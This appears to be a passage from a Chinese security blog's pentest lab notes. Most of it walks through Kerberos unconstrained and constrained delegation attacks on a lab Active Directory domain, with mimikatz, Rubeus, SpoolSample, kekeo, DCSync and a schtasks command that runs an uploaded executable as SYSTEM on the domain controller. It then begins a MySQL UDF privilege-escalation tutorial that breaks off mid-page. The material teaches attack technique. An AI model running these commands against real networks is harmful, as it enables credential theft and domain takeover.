src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711521832627-78e9ea8c-8345-489a-a031-cb9ca65372f2.png" alt="img"></p><p>4、去pc-web导出内存中的票据(要提权才能运行，这里直接传上去工具弄了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sekurlsa::tickets /export<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711524429877-2eec625a-a3e1-4bf7-ae79-4dda69433257.png" alt="img"></p><p>5、进行票据传递就可以获取域控的权限了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">mimikatz kerberos::ptt [0;30294]-2-0-40e10000-test123@krbtgt-HSMYZJ.XYZ.kirbi<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711524600944-fdcbd5eb-3553-46c9-82d3-48c9763ee972.png" alt="img"></p><p>6、访问域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell dir \\AD-2016.hsmyzj.xyz\c$<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711524664400-29b5ea77-b0a1-4dbd-b8c2-57964e253c8a.png" alt="img"></p><p>7、使用计划任务，服务，或者无文件的powershell上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">copy 123.exe \\AD-2016.hsmyzj.xyz\C$<br>shell schtasks /create /s AD-2016.hsmyzj.xyz /tn test /sc onstart /tr c:\123.exe /ru system /f<br>shell schtasks /run /s AD-2016.hsmyzj.xyz /i /tn &quot;test&quot;<br></code></pre></td></tr></table></figure><h3 id="利用非约束委派域控被动访问控制域控"><a href="#利用非约束委派域控被动访问控制域控" class="headerlink" title="利用非约束委派域控被动访问控制域控"></a>利用非约束委派域控被动访问控制域控</h3><table><thead><tr><th><strong>机器位置</strong></th><th><strong>机器****IP</strong></th><th><strong>机器****名</strong></th><th><strong>机器登录用户</strong></th><th><strong>所属域</strong></th><th><strong>委派配置</strong></th></tr></thead><tbody><tr><td>域内域控制</td><td><a href="https://192.168.41.10/">192.168.</a>3.191</td><td>AD-2016</td><td>hsmyzj\administrator</td><td>hsmyzj.xyz</td><td>域控</td></tr><tr><td>域内机器</td><td><a href="https://192.168.41.184/">192.168.</a>3.190</td><td>web-2012</td><td>hack\test123</td><td>hsmyzj.xyz</td><td></td></tr></tbody></table><p>实验前提：控制了域内的一台机器OA，并且该机器的服务账号配置了非约束委派，如下：</p><p>一般域管不会主动访问我们，我们可以利用Windows打印系统远程协议（MS-RPRN）中的一种旧的</p><p>但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN</p><p>RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了Spooler 服务的计算机以通过Kerberos或NTLM 对攻击者选择的目标进行身份验证。非约束性委派主机结合Spooler打印机服务漏洞，让域控机器 DC 强制访问已控的具有本地管理员权限的非约束性委派机器 OA ，从而拿到域管理员的TGT，进而接管域控。（要.NET 2008机器可能复现不了，因为版本的问题）</p><p>1、首先利用Rubeus在 OA 上以本地管理员权限执行以下命令，每隔一秒监听来自域控机器 DC 的登录 信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Rubeus.exe monitor /interval:1 /filteruser:AD-2016$<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711539904599-d399dae2-f62d-4b9c-8af4-73d33cfd086d.png" alt="img"></p><p>再利用SpoolSample强制域控打印机回连，需在域用户进程上执行，所以这里切换成了普通域用户帐号 去执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SpoolSample.exe AD-2016 web-2016<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711539924849-d7d4c409-c3dd-4a05-a01b-c08d70ec1ec1.png" alt="img"></p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711541133744-63dd01b2-727b-460b-a794-3e8c589bfbf8.png" alt="img"></p><p>Rubeus监听到票据后，Rubeus导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Rubeus.exe ptt /ticket:票据<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383782024-aa778b1d-197b-46ac-9b0d-553c7e623151.png" alt="img"></p><p>获取域内用户的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">lsadump::dcsync /all /csv<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711525041860-2c5e66e1-34ef-4a86-aeab-8d5478a75117.png" alt="img"></p><p>导入票据即可</p><h3 id="构造服务账户票据控制域控"><a href="#构造服务账户票据控制域控" class="headerlink" title="构造服务账户票据控制域控"></a>构造服务账户票据控制域控</h3><p>实验前提</p><ol><li>服务账户设置了非约束性委派</li><li>已知服务账户的密码口令信息</li></ol><p>1、使用 adﬁnd发现服务账号test设置了非约束委派</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -b &quot;DC=hsmyzj,DC=xyz&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383882371-125bb49e-b737-4a18-98ce-4ec6327f1693.png" alt="img"></p><p>2、构造服务账户TGT的票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">kekeo.exe &quot;tgt::ask /user:test123 /domain:hsmyzj.xyz /password:Abc123..<br>/ticket:test123.kirbi&quot; &quot;exit&quot;<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383899546-d14d96ee-5327-4ab8-8379-dd7d47b54f9c.png" alt="img"></p><p>3、利用刚才伪造的TGT票据，向域服务器申请CIFS服务票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">kekeo.exe &quot;Tgs::s4u /tgt:TGT_test@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi<br>/user:administrator@hack.com /service:cifs/DC.HACK.COM&quot; &quot;exit&quot;<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383917111-9c30f67b-f831-460e-b2cd-f41e38a2b837.png" alt="img"></p><p>使用mimikatz将该票据注入当前的会话中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">mimikatz kerberos::ptt TGS_administrator@hack.com@HACK.COM_test@HACK.COM.kirbi<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709383930918-cbbc564e-88ac-4dfe-b827-f67e465a1355.png" alt="img"></p><p>访问域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">shell  dir \\dc.hack.com\c$<br></code></pre></td></tr></table></figure><h2 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a>约束性委派攻击</h2><h3 id="约束性委派场景"><a href="#约束性委派场景" class="headerlink" title="约束性委派场景"></a>约束性委派场景</h3><p>当这个用户不在域内，他在出差，不能使用kerberos去认证，只能使用其他协议认证web系统，那同样 WEB系统也需要访问文件服务的资源，这个时候如何认证呢？</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709384319650-f3fe4166-7777-44a6-9628-6bcca004d250.png" alt="img"></p><p>Widnows Server 2003 之后微软引入了非约束委派。由于非约束委派的不安全性或者场景受限（配置了 非约束委派的机器在LSASS 中缓存了用户的TGT 票据可模拟用户去访问域中任意服务），微软于2007</p><p>年为Kerberos协议进行扩展引入S4U(service for user)协议，该协议分为两个子协议</p><p>1、S4u2self（ Service for User to Self）</p><p>2、S4U2proxy（ Service for User to Proxy）</p><p>这两个扩展都允许服务代表用户从KDC请求票证。</p><p>约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的 其他服务</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709384329428-fd4365e2-6bb9-46a3-8659-9f3293d34c01.png" alt="img"></p><p>存在的问题</p><p>1、服务账号B可以代表A申请访问B的票据，那么可不可以代表域管申请域管访问B的票据呢？在这个过 程中，不需要域管参与，服务B自身就可以完成</p><p>2、服务账号B可以代表A申请访问C的票据，那么可不可以代表域管申请域管访问C的票据呢？在这个过 程中，不需要域管参与，服务B自身就可以完成</p><h3 id="约束性委派攻击流程"><a href="#约束性委派攻击流程" class="headerlink" title="约束性委派攻击流程"></a>约束性委派攻击流程</h3><p>用户（A）访问WEB系统（B）,B代表A去向KDC申请访问B的TGT和ST1(使用S4u2self),用户A拿到了ST1 就可以访问B了，如果在B上配置了约束性委派（A到C的约束委派），则B能够使用S4U2Proxy协议将用 户发给自己的可转发的ST1票据以用户的身份发给KDC,KDC返回B一个访问C的票据ST2，这样B就可以   以用户的身份访问C</p><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1709384346896-9fd64334-13ae-41ab-9cfc-b4b12722d712.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">1.通过NTLM或者其他认证<br>2.B代表A申请A访问B的票据(TGT和ST1)<br>3.KDC返回用户的TGT和ST1票据给B<br>4.B把ST1票据给A<br>5.A用ST1去访问B<br>6.B拿着A的ST1作为证据，去申请访问C的ST2<br>7.B用ST2票据访问C<br></code></pre></td></tr></table></figure><p>存在的问题是什么呢？</p><p>B会获取A的TGT,只要能伪造A的TGT,就可以用TGT申请ST1票据（伪造管理员申请ST1票据）</p><h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p>实验场景如下：</p><table><thead><tr><th><strong>机器位置</strong></th><th><strong>机器****IP</strong></th><th><strong>机器名</strong></th><th><strong>机器登录用户</strong></th><th><strong>所属域</strong></th><th><strong>委派配置</strong></th></tr></thead><tbody><tr><td>域内域控制 器</td><td><a href="https://192.168.41.10/">192.168.</a>3.191</td><td>AD-2016</td><td>hsmyzj\administrator</td><td>hsmyzj.xyz</td><td>域控</td></tr><tr><td>域内机器</td><td><a href="https://192.168.41.15/">192.168.</a>3.187</td><td>web-2016</td><td>hsmyzj\test123</td><td>hsmyzj.xyz</td><td>配置了约束委派</td></tr></tbody></table><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711553072070-981d078b-271a-4226-882a-03d031a0f4ac.png" alt="img"></p><p>实验前提：我们已经控制了test123的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器 用户的HASH值</p><p>1、查询约束性委派的机器和用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">查询约束委派机器账户<br>AdFind.exe -h 192.168.3.187 -u test123 -up Abc123.. -b &quot;DC=hsmyzj,DC=xyz&quot; -f &quot; (&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto<br>查询约束委派主机<br>AdFind.exe -h 192.168.3.187 -u test123 -up Abc123.. -b &quot;DC=hsmyzj,DC=xyz&quot; -f &quot; (&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711552382462-a292d45b-a0a9-4f29-bec7-26ecd7eecf21.png" alt="img"></p><p>查询到test123配置了约束委派，委派的目标是AD-2016(域控)的CIFS服务</p><p>2、使用mimikatz获取机器账户NTLM Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">mimikatz privilege::debug<br>mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711549702370-5390e4ab-9434-49d2-89c4-8254f045bb59.png" alt="img"></p><p>3、使用kekeo申请配置了约束委派机器账户PC-ZS$的TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">kekeo &quot;tgt::ask /user:WEB-2016$ /NTLM:311861857b37570908d075802d62d09d /domain:hsmyzj.xyz&quot; &quot;exit&quot;<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711552684805-53a920bf-1496-4294-84a9-5784f03021b6.png" alt="img"></p><p>利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">kekeo &quot;tgs::s4u /tgt:TGT_WEB-2016$@HSMYZJ.XYZ_krbtgt~hsmyzj.xyz@HSMYZJ.XYZ.kirbi /user:Administrator@hsmyzj.xyz /service:cifs/AD-2016.hsmyzj.xyz&quot; &quot;exit&quot;<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711552817027-4e659294-d7b1-4ced-a3a1-6ad1a20e01c1.png" alt="img"></p><p>mimkatz注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">mimikatz kerberos::ptt TGS_Administrator@hsmyzj.xyz@HSMYZJ.XYZ_WEB-2016$@HSMYZJ.XYZ.kirbi<br></code></pre></td></tr></table></figure><p><img src="/../../../../%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711552881707-08dc1b84-89ba-48e1-8eab-32ee2e290a2e.png" alt="img"></p><p>访问域控</p><p><img src="/./%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB.assets/1711552926596-7787c5d4-2187-4969-ae1d-d7bf1e314482.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库提权</title>
    <link href="/2025/01/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <url>/2025/01/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p>MySQL有很多内置函数提供给使用者，包括字符串函数、数值函数、日期和时间函数等，给开发人员和使用者带来了很多方便</p><h4 id="UDF介绍"><a href="#UDF介绍" class="headerlink" title="UDF介绍"></a>UDF介绍</h4><p>MySQL的内置函数虽然丰富，但毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，幸运的是，MySQL给使用者提供了添加新函数的机制，这种使用者自行添加的MySQL函数就称为UDF(User Define Function)。UDF机制能够起作用，必须使用C或者C++编写函数，你的系统必须支持动态加载,，mysql采用动态链接库加载自定义函数。</p><p>udf就是为了让我们开发者能够自己写方便自己函数，它有3种返回值，这三种分别是STRING，INTEGER，REAL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">STRING        字符型<br>INTEGER       整型<br>REAL          实数型<br></code></pre></td></tr></table></figure><p><strong>如下面的代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;mysql.h&gt;<br> extern &quot;C&quot; long long testadd(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)<br>&#123;<br>int a = *((long long *)args-&gt;args[0]);<br>int b = *((long long *)args-&gt;args[1]);<br>return a + b;<br>&#125;<br>extern &quot;C&quot; my_bool testadd_init(UDF_INIT *initid, UDF_ARGS *args, char *message)<br>&#123;<br>return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="UDF编写详解"><a href="#UDF编写详解" class="headerlink" title="UDF编写详解"></a>UDF编写详解</h3><h4 id="用户主函数"><a href="#用户主函数" class="headerlink" title="用户主函数"></a>用户主函数</h4><p>我们假设需要定义的函数名字为为xxx, 则我们的函数需要有参数列表和返回值, 这不能由用户随意指定, 是有固定规则的</p><p>返回值是STRING 类型或DECIMAL类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">char *xxx(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error);<br></code></pre></td></tr></table></figure><p>返回值是INTEGER类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">long long xxx(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);<br></code></pre></td></tr></table></figure><p>返回值是REAL类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">double xxx(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);<br></code></pre></td></tr></table></figure><h4 id="系统内置函数"><a href="#系统内置函数" class="headerlink" title="系统内置函数"></a>系统内置函数</h4><p>在完成了用户定义的主函数以后, 还需要编写配套的系统内置函数</p><h5 id="xxx-init函数"><a href="#xxx-init函数" class="headerlink" title="xxx_init函数"></a>xxx_init函数</h5><p>这个函数会在自定义的xxx函数调用前被调用, 进行基本的初始化工作, 其完整定义如下，该函数的主要功能一般是分配空间, 函数参数检查的等. 如果不需要做任何操作, 直接返回0即可.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">my_bool xxx_init(UDF_INIT *initid, UDF_ARGS *args, char *message)<br></code></pre></td></tr></table></figure><p>返回值: 1代表出错, 可以在message中给出错误信息并且返回给客户端, 0表示正确执行</p><h5 id="xxx-deinit"><a href="#xxx-deinit" class="headerlink" title="xxx_deinit"></a>xxx_deinit</h5><p>该函数用于释放申请的空间, 其完整定义如下，该函数的功能主要是释放资源, 如果在xxx_init中申请了内存, 可以在此处释放, 该函数在用户函数xxx执行以后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">void xxx_deinit(UDF_INIT *initid);<br></code></pre></td></tr></table></figure><h4 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h4><p>调用xxx_init来初始化, 并申请内存空间用于存储结果</p><p>调用xxx</p><p>调用xxx_deinit释放空间</p><h3 id="运行自己的UDF"><a href="#运行自己的UDF" class="headerlink" title="运行自己的UDF"></a>运行自己的UDF</h3><h4 id="编写C-C-代码"><a href="#编写C-C-代码" class="headerlink" title="编写C&#x2F;C++代码"></a>编写C&#x2F;C++代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;mysql.h&gt;<br> extern &quot;C&quot; long long testadd(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)<br>&#123;<br>int a = *((long long *)args-&gt;args[0]);<br>int b = *((long long *)args-&gt;args[1]);<br>return a + b;<br>&#125;<br>extern &quot;C&quot; my_bool testadd_init(UDF_INIT *initid, UDF_ARGS *args, char *message)<br>&#123;<br>return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="生成动态链接库"><a href="#生成动态链接库" class="headerlink" title="生成动态链接库"></a>生成动态链接库</h4><p>动态链接提供了一种方法，使进程可以调用不属于其可执行代码的函数。函数的可执行代码位于一个 DLL 文件中，该 DLL 包含一个或多个已被编译、链接并与使用它们的进程分开存储的函数。DLL 还有助于共享数据和资源。多个应用程序可同时访问内存中单个 DLL 副本的内容。windows是dll文件，linux是so文件</p><p>windows使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">使用vs创建dll文件即可<br></code></pre></td></tr></table></figure><p>linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">g++ -shared -fPIC -I /usr/include/mysql -o udf.so udf.cpp<br></code></pre></td></tr></table></figure><h4 id="上传到目标机器"><a href="#上传到目标机器" class="headerlink" title="上传到目标机器"></a>上传到目标机器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">1、mysql&lt;5.0,路径随意<br>3、5.0&lt;=MYsql&lt;5.1， 放置系统目录（system32） C:\Windows\system32<br>2、mysql&gt;5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下，(lib\plugin目录默认不存在，需自行创建)<br></code></pre></td></tr></table></figure><h4 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h4><p>函数名字必须和源码中一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">create function 函数名 returns string soname &quot;udf.dll&quot;;<br></code></pre></td></tr></table></figure><p>查询是否导入成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select * from mysql.func;<br></code></pre></td></tr></table></figure><h4 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select  函数名（参数）;<br></code></pre></td></tr></table></figure><h3 id="提权准备"><a href="#提权准备" class="headerlink" title="提权准备"></a>提权准备</h3><h4 id="连接mysql"><a href="#连接mysql" class="headerlink" title="连接mysql"></a>连接mysql</h4><p>连接mysql的方式很多，比如拿到了webshell，或者通过暴力破解的方式，udf提权第一步就是先连接mysql</p><h4 id="查询运行权限"><a href="#查询运行权限" class="headerlink" title="查询运行权限"></a>查询运行权限</h4><p>为什么要查询运行权限呢？因为我们udf本质上不是提权，是通过当前mysql的运行权限去执行系统命令，如果mysql运行权限太低的话就无法执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">select users(); 错误的<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061648772.png" alt="img"></p><h4 id="查询软件版本"><a href="#查询软件版本" class="headerlink" 